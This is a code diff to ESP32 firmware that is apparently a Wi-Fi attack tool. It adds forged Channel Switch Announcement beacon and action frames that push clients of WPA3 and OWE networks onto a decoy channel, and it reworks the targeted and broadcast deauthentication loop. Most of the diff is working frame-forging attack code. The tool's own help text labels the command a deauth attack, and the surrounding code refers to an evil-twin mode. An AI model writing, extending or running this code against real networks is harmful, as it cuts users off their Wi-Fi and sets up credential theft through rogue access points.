@@ -132,7 +132,7 @@
 #endif
 
 //Version number
-#define JANOS_VERSION "1.7.3"
+#define JANOS_VERSION "1.7.4"
 
 #define OTA_GITHUB_OWNER "C5Lab"
 #define OTA_GITHUB_REPO "projectZero"
@@ -239,6 +239,7 @@ typedef struct {
     uint8_t bssid[6];
     char ssid[33];
     uint8_t channel;
+    wifi_auth_mode_t authmode;
     uint32_t last_seen;
     bool active;
 } target_bssid_t;
@@ -1614,6 +1615,110 @@ static int build_beacon_frame(uint8_t *frame_buffer, size_t buffer_size, const c
     frame_buffer[pos++] = 0x01; // Length
     frame_buffer[pos++] = channel; // Channel from parameter
 
+    return pos;
+}
+
+static bool authmode_needs_csa(wifi_auth_mode_t mode)
+{
+    return mode == WIFI_AUTH_WPA3_PSK
+        || mode == WIFI_AUTH_WPA2_WPA3_PSK
+        || mode == WIFI_AUTH_OWE;
+}
+
+static bool authmode_needs_deauth(wifi_auth_mode_t mode)
+{
+    return mode != WIFI_AUTH_WPA3_PSK && mode != WIFI_AUTH_OWE;
+}
+
+static uint8_t csa_operating_class(uint8_t channel)
+{
+    if (channel >= 1 && channel <= 13) {
+        return 81;
+    }
+    if (channel == 14) {
+        return 82;
+    }
+    if (channel >= 36 && channel <= 48) {
+        return 115;
+    }
+    if (channel >= 52 && channel <= 64) {
+        return 118;
+    }
+    if (channel >= 100 && channel <= 144) {
+        return 121;
+    }
+    if (channel >= 149 && channel <= 177) {
+        return 125;
+    }
+    return (channel <= 14) ? 81 : 115;
+}
+
+static uint8_t csa_decoy_channel(uint8_t ap_channel)
+{
+    if (ap_channel > 14) {
+        return (ap_channel == 36) ? 40 : 36;
+    }
+    return (ap_channel == 1) ? 6 : 1;
+}
+
+static int build_csa_beacon_frame(uint8_t *frame_buffer, size_t buffer_size,
+                                  const char *ssid, const uint8_t *bssid,
+                                  uint8_t ap_channel, uint8_t decoy_channel)
+{
+    int pos = build_beacon_frame(frame_buffer, buffer_size, ssid, bssid, ap_channel);
+    if (pos <= 0) {
+        return 0;
+    }
+    if ((size_t)pos + 14 > buffer_size) {
+        return 0;
+    }
+
+    uint8_t op_class = csa_operating_class(decoy_channel);
+    frame_buffer[pos++] = 0x25; // CSA IE
+    frame_buffer[pos++] = 0x03;
+    frame_buffer[pos++] = 0x01;
+    frame_buffer[pos++] = decoy_channel;
+    frame_buffer[pos++] = 0x00;
+    frame_buffer[pos++] = 0x3C; // ECSA IE
+    frame_buffer[pos++] = 0x04;
+    frame_buffer[pos++] = 0x01;
+    frame_buffer[pos++] = op_class;
+    frame_buffer[pos++] = decoy_channel;
+    frame_buffer[pos++] = 0x00;
+    frame_buffer[pos++] = 0x3E; // Secondary Channel Offset SCN
+    frame_buffer[pos++] = 0x01;
+    frame_buffer[pos++] = 0x00;
+    return pos;
+}
+
+static int build_csa_action_frame(uint8_t *frame_buffer, size_t buffer_size,
+                                  const uint8_t *dest, const uint8_t *bssid,
+                                  uint8_t decoy_channel)
+{
+    if (!frame_buffer || !dest || !bssid || buffer_size < 31) {
+        return 0;
+    }
+
+    int pos = 0;
+    frame_buffer[pos++] = 0xD0; // Action
+    frame_buffer[pos++] = 0x00;
+    frame_buffer[pos++] = 0x00;
+    frame_buffer[pos++] = 0x00;
+    memcpy(&frame_buffer[pos], dest, 6);
+    pos += 6;
+    memcpy(&frame_buffer[pos], bssid, 6);
+    pos += 6;
+    memcpy(&frame_buffer[pos], bssid, 6);
+    pos += 6;
+    frame_buffer[pos++] = 0x00;
+    frame_buffer[pos++] = 0x00;
+    frame_buffer[pos++] = 0x00; // Category: Spectrum Management
+    frame_buffer[pos++] = 0x04; // Action: Channel Switch Announcement
+    frame_buffer[pos++] = 0x25;
+    frame_buffer[pos++] = 0x03;
+    frame_buffer[pos++] = 0x01;
+    frame_buffer[pos++] = decoy_channel;
+    frame_buffer[pos++] = 0x00;
     return pos;
 }
 
@@ -4100,6 +4205,7 @@ static void save_target_bssids(void) {
         wifi_ap_record_t *ap = &g_scan_results[idx];
         
         target_bssids[target_bssid_count].channel = ap->primary;
+        target_bssids[target_bssid_count].authmode = ap->authmode;
         target_bssids[target_bssid_count].last_seen = esp_timer_get_time() / 1000;
         target_bssids[target_bssid_count].active = true;
         
@@ -4120,6 +4226,16 @@ static void save_target_bssids(void) {
                    target_bssids[i].bssid[0], target_bssids[i].bssid[1], target_bssids[i].bssid[2],
                    target_bssids[i].bssid[3], target_bssids[i].bssid[4], target_bssids[i].bssid[5],
                    target_bssids[i].channel);
+        if (authmode_needs_csa(target_bssids[i].authmode)) {
+            uint8_t decoy = csa_decoy_channel(target_bssids[i].channel);
+            if (authmode_needs_deauth(target_bssids[i].authmode)) {
+                MY_LOG_INFO(TAG, "Deauth+CSA: %s ch=%d -> decoy %d",
+                            target_bssids[i].ssid, target_bssids[i].channel, decoy);
+            } else {
+                MY_LOG_INFO(TAG, "CSA: %s ch=%d -> decoy %d",
+                            target_bssids[i].ssid, target_bssids[i].channel, decoy);
+            }
+        }
     }
 }
 
@@ -4236,6 +4352,7 @@ static void update_target_channels(wifi_ap_record_t *scan_results, uint16_t scan
             if (memcmp(target_bssids[i].bssid, scan_results[j].bssid, 6) == 0) {
                 uint8_t old_channel = target_bssids[i].channel;
                 target_bssids[i].channel = scan_results[j].primary;
+                target_bssids[i].authmode = scan_results[j].authmode;
                 target_bssids[i].last_seen = esp_timer_get_time() / 1000;
                 found = true;
                 
@@ -24381,7 +24498,7 @@ static void register_commands(void)
 
     const esp_console_cmd_t deauth_cmd = {
         .command = "start_deauth",
-        .help = "Starts Deauth attack.",
+        .help = "Starts Deauth attack. WPA3/mixed targets get Channel Switch Announcement frames.",
         .hint = NULL,
         .func = &cmd_start_deauth,
         .argtable = NULL
@@ -25487,6 +25604,48 @@ void app_main(void) {
     
 }
 
+static void wsl_bypasser_send_csa_frames(const target_bssid_t *target)
+{
+    static const uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    uint8_t decoy;
+    uint8_t beacon[256];
+    uint8_t action[32];
+    int beacon_len;
+    int action_len;
+
+    if (!target) {
+        return;
+    }
+
+    decoy = csa_decoy_channel(target->channel);
+    beacon_len = build_csa_beacon_frame(beacon, sizeof(beacon),
+                                        target->ssid, target->bssid,
+                                        target->channel, decoy);
+    if (beacon_len > 0) {
+        wsl_bypasser_send_raw_frame(beacon, beacon_len);
+    }
+
+    action_len = build_csa_action_frame(action, sizeof(action),
+                                        broadcast_mac, target->bssid, decoy);
+    if (action_len > 0) {
+        wsl_bypasser_send_raw_frame(action, action_len);
+    }
+
+    if (selected_stations_count > 0 && applicationState == DEAUTH) {
+        for (int s = 0; s < selected_stations_count; s++) {
+            if (!selected_stations[s].active) {
+                continue;
+            }
+            action_len = build_csa_action_frame(action, sizeof(action),
+                                                selected_stations[s].mac,
+                                                target->bssid, decoy);
+            if (action_len > 0) {
+                wsl_bypasser_send_raw_frame(action, action_len);
+            }
+        }
+    }
+}
+
 void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, size_t count) {   
     if (applicationState == EVIL_TWIN_PASS_CHECK ) {
         ESP_LOGW(TAG, "Deauth stop requested in Evil Twin flow, checking for password, will do nothing here..");
@@ -25541,26 +25700,35 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, s
             vTaskDelay(pdMS_TO_TICKS(50));
         }
 
-        // If stations are selected AND we're in regular DEAUTH mode (not evil_twin/blackout), send targeted deauth
-        if (selected_stations_count > 0 && applicationState == DEAUTH) {
-            for (int s = 0; s < selected_stations_count; s++) {
-                if (!selected_stations[s].active) continue;
-                
+        const bool send_deauth = authmode_needs_deauth(target_bssids[i].authmode);
+        const bool send_csa = authmode_needs_csa(target_bssids[i].authmode);
+
+        if (send_deauth) {
+            // If stations are selected AND we're in regular DEAUTH mode (not evil_twin/blackout), send targeted deauth
+            if (selected_stations_count > 0 && applicationState == DEAUTH) {
+                for (int s = 0; s < selected_stations_count; s++) {
+                    if (!selected_stations[s].active) continue;
+                    
+                    uint8_t deauth_frame[sizeof(deauth_frame_default)];
+                    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+                    // Set destination to specific station (not broadcast!)
+                    memcpy(&deauth_frame[4], selected_stations[s].mac, 6);
+                    memcpy(&deauth_frame[10], target_bssids[i].bssid, 6);
+                    memcpy(&deauth_frame[16], target_bssids[i].bssid, 6);
+                    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+                }
+            } else {
+                // Broadcast deauth (original behavior)
                 uint8_t deauth_frame[sizeof(deauth_frame_default)];
                 memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-                // Set destination to specific station (not broadcast!)
-                memcpy(&deauth_frame[4], selected_stations[s].mac, 6);
                 memcpy(&deauth_frame[10], target_bssids[i].bssid, 6);
                 memcpy(&deauth_frame[16], target_bssids[i].bssid, 6);
                 wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
             }
-        } else {
-            // Broadcast deauth (original behavior)
-            uint8_t deauth_frame[sizeof(deauth_frame_default)];
-            memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-            memcpy(&deauth_frame[10], target_bssids[i].bssid, 6);
-            memcpy(&deauth_frame[16], target_bssids[i].bssid, 6);
-            wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+        }
+
+        if (send_csa) {
+            wsl_bypasser_send_csa_frames(&target_bssids[i]);
         }
         
         // If clients are connected during classic evil twin, return to SoftAP channel
